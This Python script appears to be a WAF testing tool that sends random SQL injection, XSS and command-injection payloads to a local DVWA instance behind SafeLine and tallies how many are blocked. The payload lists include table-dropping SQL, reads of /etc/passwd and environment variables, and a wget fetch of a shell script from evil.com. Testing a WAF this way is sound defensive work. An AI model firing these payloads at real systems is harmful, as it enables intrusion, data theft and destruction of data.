#!/usr/bin/env python3
"""
Continuous Attack Scenario Testing
Runs various attack patterns against SafeLine WAF continuously
"""

import requests
import time
import random
from datetime import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ContinuousAttackTester:
    def __init__(self, target_host="127.0.0.1", target_domain="dvwa.local"):
        self.target_host = target_host
        self.target_domain = target_domain
        self.attack_count = 0
        self.blocked_count = 0
        self.success_count = 0
        self.error_count = 0
        
        # Attack payloads
        self.sql_payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT 1,2,3--",
            "1'; DROP TABLE users--",
            "1' AND 1=1--",
            "admin'--",
            "' OR 1=1#",
            "1' ORDER BY 10--",
            "1' UNION ALL SELECT NULL--",
            "1'; INSERT INTO users VALUES('hacker','pass')--",
            "1' AND SLEEP(5)--"
        ]
        
        self.xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "'><script>alert('xss')</script>",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>"
        ]
        
        self.cmd_payloads = [
            "; cat /etc/passwd",
            "| id",
            "&& whoami",
            "; ls -la",
            "| cat /etc/hosts",
            "&& ps aux",
            "; netstat -an",
            "| cat /proc/version",
            "&& env",
            "; wget http://evil.com/shell.sh"
        ]
        
        self.paths = [
            "/",
            "/index.php",
            "/login.php",
            "/search",
            "/vulnerabilities/sqli/",
            "/vulnerabilities/xss_r/",
            "/vulnerabilities/exec/",
            "/admin",
            "/config.php",
            "/setup.php"
        ]
    
    def send_attack(self, payload, attack_type, path="/"):
        """Send a single attack request"""
        try:
            headers = {
                'Host': self.target_domain,
                'User-Agent': 'AttackBot/1.0'
            }
            
            if attack_type == "sql":
                params = {'id': payload, 'Submit': 'Submit'}
                url = f"http://{self.target_host}{path}"
                response = requests.get(url, params=params, headers=headers, timeout=5)
            elif attack_type == "xss":
                params = {'q': payload}
                url = f"http://{self.target_host}{path}"
                response = requests.get(url, params=params, headers=headers, timeout=5)
            elif attack_type == "cmd":
                params = {'cmd': payload}
                url = f"http://{self.target_host}{path}"
                response = requests.get(url, params=params, headers=headers, timeout=5)
            else:
                # Direct path injection
                url = f"http://{self.target_host}{path}?{payload}"
                response = requests.get(url, headers=headers, timeout=5)
            
            return response.status_code, response.reason, len(response.content)
            
        except requests.exceptions.Timeout:
            return 504, "Timeout", 0
        except requests.exceptions.ConnectionError:
            return 0, "Connection Error", 0
        except Exception as e:
            return 0, str(e), 0
    
    def log_attack(self, attack_type, payload, status_code, reason, size):
        """Log attack result"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        payload_short = payload[:50] + "..." if len(payload) > 50 else payload
        
        if status_code == 403:
            status_emoji = "🔒"
            self.blocked_count += 1
        elif status_code == 200:
            status_emoji = "⚠️"
            self.success_count += 1
        elif status_code == 504:
            status_emoji = "⏱️"
            self.error_count += 1
        else:
            status_emoji = "❓"
            self.error_count += 1
        
        print(f"{timestamp} {status_emoji} {attack_type.upper():4} | {status_code:3} {reason:15} | {payload_short}")
        
        # Print summary every 50 attacks
        if self.attack_count % 50 == 0:
            self.print_summary()
    
    def print_summary(self):
        """Print attack summary"""
        block_rate = (self.blocked_count / self.attack_count * 100) if self.attack_count > 0 else 0
        print(f"\n📊 Summary after {self.attack_count} attacks:")
        print(f"   🔒 Blocked: {self.blocked_count} ({block_rate:.1f}%)")
        print(f"   ⚠️ Success: {self.success_count}")
        print(f"   ❓ Errors:  {self.error_count}")
        print("-" * 70)
    
    def run_continuous_attacks(self):
        """Run continuous attack scenarios"""
        print("🚀 Starting Continuous Attack Testing")
        print("=" * 70)
        print("Target: {} (Host: {})".format(self.target_domain, self.target_host))
        print("Attack Types: SQL Injection, XSS, Command Injection")
        print("Press Ctrl+C to stop")
        print("-" * 70)
        print("Time     Type | Status Response     | Payload")
        print("-" * 70)
        
        try:
            while True:
                # Randomly select attack type and payload
                attack_type = random.choice(["sql", "xss", "cmd"])
                path = random.choice(self.paths)
                
                if attack_type == "sql":
                    payload = random.choice(self.sql_payloads)
                elif attack_type == "xss":
                    payload = random.choice(self.xss_payloads)
                else:  # cmd
                    payload = random.choice(self.cmd_payloads)
                
                # Send attack
                self.attack_count += 1
                status_code, reason, size = self.send_attack(payload, attack_type, path)
                
                # Log result
                self.log_attack(attack_type, payload, status_code, reason, size)
                
                # Random delay between attacks (0.5-2 seconds)
                delay = random.uniform(0.5, 2.0)
                time.sleep(delay)
                
        except KeyboardInterrupt:
            print(f"\n\n🛑 Attack testing stopped by user")
            self.print_summary()
            
            # Final detailed report
            print(f"\n📋 Final Report:")
            print(f"   Duration: Attack testing session")
            print(f"   Total Attacks: {self.attack_count}")
            print(f"   Blocked (403): {self.blocked_count}")
            print(f"   Successful (200): {self.success_count}")
            print(f"   Timeouts (504): {self.error_count}")
            
            if self.attack_count > 0:
                block_rate = self.blocked_count / self.attack_count * 100
                print(f"   Block Rate: {block_rate:.1f}%")
                
                if block_rate > 90:
                    print("   🛡️ Excellent WAF protection!")
                elif block_rate > 70:
                    print("   ✅ Good WAF protection")
                elif block_rate > 50:
                    print("   ⚠️ Moderate WAF protection")
                else:
                    print("   ❌ Poor WAF protection")

def main():
    print("🛡️ SafeLine WAF Continuous Attack Tester")
    print("=" * 50)
    
    tester = ContinuousAttackTester()
    tester.run_continuous_attacks()

if __name__ == "__main__":
    main()